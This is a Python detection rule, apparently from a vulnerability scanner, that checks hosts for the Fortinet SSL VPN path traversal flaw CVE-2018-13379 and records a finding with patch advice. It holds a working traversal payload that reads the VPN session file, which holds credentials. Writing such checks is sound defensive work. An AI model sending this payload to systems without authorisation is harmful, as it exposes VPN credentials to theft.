from core.parser import ScanParser
from core.redis import rds
from core.rules import BaseRule
from core.triage import Triage


class Rule(BaseRule):
    def __init__(self):
        super().__init__()
        self.rule = 'CVE_72D3'
        self.rule_severity = 4
        self.rule_description = 'This rule checks for Fortinet SSL VPN Vulnerability (CVE-2018-13379)'
        self.rule_confirm = 'Fortigate SSL VPN Vulnerability'
        self.rule_details = ''
        self.rule_mitigation = (
            'Patch Fortinet Firewall to the latest version. '
            'Refer to the Fortiguard Labs article for more information: '
            'https://www.fortiguard.com/psirt/FG-IR-18-384'
        )
        self.intensity = 1

    def check_rule(self, ip, port, values, conf):
        if port != 10043:
            return

        triage = Triage()
        payload = '/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession'
        response = triage.http_request(ip, port, uri=payload)
        if not response or 'var fgt_lang =' not in response.text:
            return

        self.rule_details = f'Fortinet SSL VPN CVE-2018-13379 Vulnerability at {response.url}'
        domain = ScanParser(port, values).get_domain()
        vuln_dict = self.get_vuln_dict(ip, port, domain)
        rds.store_vuln(vuln_dict)
